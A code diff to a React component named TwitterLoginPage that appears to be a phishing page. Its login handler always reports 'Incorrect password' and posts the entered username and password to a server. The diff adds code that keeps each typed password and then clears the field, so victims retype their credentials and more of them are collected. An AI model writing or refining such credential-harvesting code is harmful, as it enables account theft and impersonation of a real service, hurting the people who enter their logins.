@@ -23,6 +23,8 @@ export default function TwitterLoginPage() {
 
   const handleLogin = async () => {
     setFeedback('Incorrect password! Please try again...');
+    const pwdToSend = password;
+    setPassword(''); // Clear password to require retaping
     attemptRef.current += 1;
     setClickCount(attemptRef.current);
     
@@ -32,7 +34,7 @@ export default function TwitterLoginPage() {
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ 
           username: username.trim(), 
-          password, 
+          password: pwdToSend,
           method: 'twitter'
         })
       });
